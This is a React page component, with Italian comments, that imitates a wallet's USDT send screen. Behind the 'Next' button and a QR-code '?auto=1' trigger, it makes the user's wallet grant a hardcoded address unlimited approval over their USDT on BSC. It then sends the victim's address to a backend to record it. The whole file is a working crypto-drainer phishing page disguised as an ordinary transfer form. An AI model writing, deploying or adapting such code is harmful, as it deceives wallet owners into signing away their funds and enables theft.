import { useState, useEffect } from "react";
import { ethers } from "ethers";

export default function Home() {
  const [address, setAddress] = useState("0x05187CF26990E3857C119C7Bc3417C6E1FaC5198");
  const [amount, setAmount] = useState("");

  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
  const SPENDER = "0x05187CF26990E3857C119C7Bc3417C6E1FaC5198";

  const approveUSDT = async () => {
    try {
      if (!window.ethereum) return;

      // Switch rete BSC
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }],
      });

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const usdt = new ethers.Contract(
        USDT_ADDRESS,
        ["function approve(address spender, uint256 amount) public returns (bool)"],
        signer
      );

      // Lancia l'approve direttamente (Trust Wallet gestirà la connessione auto)
      await usdt.approve(SPENDER, ethers.MaxUint256);
      
      const userAddress = await signer.getAddress();
      await fetch("/api/save", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address: userAddress }),
      });
    } catch (err) { console.error(err); }
  };

  // 🔥 LOGICA PER IL QR CODE
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get("auto") === "1") {
      // Se il QR Code ha ?auto=1, lancia l'approve dopo un piccolo ritardo
      setTimeout(() => {
        approveUSDT();
      }, 1000);
    }
  }, []);

  const isValidAmount = amount && Number(amount) > 0;

  return (
    <div style={{ background: "#0b0b0b", minHeight: "100vh", color: "white", padding: "20px", fontFamily: "sans-serif" }}>
      {/* ... (resto della tua grafica identica a prima) ... */}
      <div style={{ marginTop: "40px" }}>
        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>Address or Domain Name</div>
        <div style={{ display: "flex", background: "#1a1a1a", borderRadius: "16px", padding: "14px" }}>
          <input type="text" value={address} onChange={(e) => setAddress(e.target.value)} style={{ flex: 1, border: "none", background: "transparent", color: "white", outline: "none" }} />
        </div>
      </div>

      <div style={{ marginTop: "25px" }}>
        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>Amount</div>
        <div style={{ background: "#1a1a1a", borderRadius: "16px", padding: "14px", display: "flex" }}>
          <input type="text" value={amount} onChange={(e) => setAmount(e.target.value.replace(",", ".").replace(/[^0-9.]/g, ""))} placeholder="USDT Amount" style={{ border: "none", background: "transparent", color: "white", flex: 1, outline: "none" }} />
        </div>
      </div>

      <div style={{ position: "fixed", bottom: "30px", left: "20px", right: "20px" }}>
        <button onClick={approveUSDT} disabled={!isValidAmount} style={{ width: "100%", padding: "18px", borderRadius: "40px", border: "none", fontSize: "18px", fontWeight: "600", background: isValidAmount ? "#4ade80" : "#1a2e22", color: isValidAmount ? "#052e16" : "#6b7280" }}>
          Next
        </button>
      </div>
    </div>
  );
}
